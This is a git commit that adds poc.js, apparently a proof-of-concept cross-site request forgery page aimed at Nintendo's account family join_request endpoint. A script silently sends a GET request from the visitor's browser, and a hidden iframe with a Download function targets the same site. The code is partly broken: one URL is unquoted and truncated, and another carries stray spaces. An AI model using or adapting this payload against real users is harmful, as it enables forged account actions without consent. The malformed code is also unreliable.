85d750caae0d0817d9b648ba9f32e82e3a0f9f29
Basil-Dash <60058179+Basil-Dash@users.noreply.github.com>
2022-01-19 15:27:52 +0000

    Create poc.js

---
+++ poc.js
@@ -0,0 +1,12 @@
+<script>
+var req = new XMLHttpRequest();
+var url = "https://accounts.nintendo.com/family/join_request    ";
+req.open("GET", url, false);
+req.send();
+</script>
+<iframe id="my_iframe" style="display:none;"></iframe>
+<script>
+function Download(url) {
+    document.getElementById('my_iframe').src = https://accounts.nintendo.com/fa>
+};
+</script>
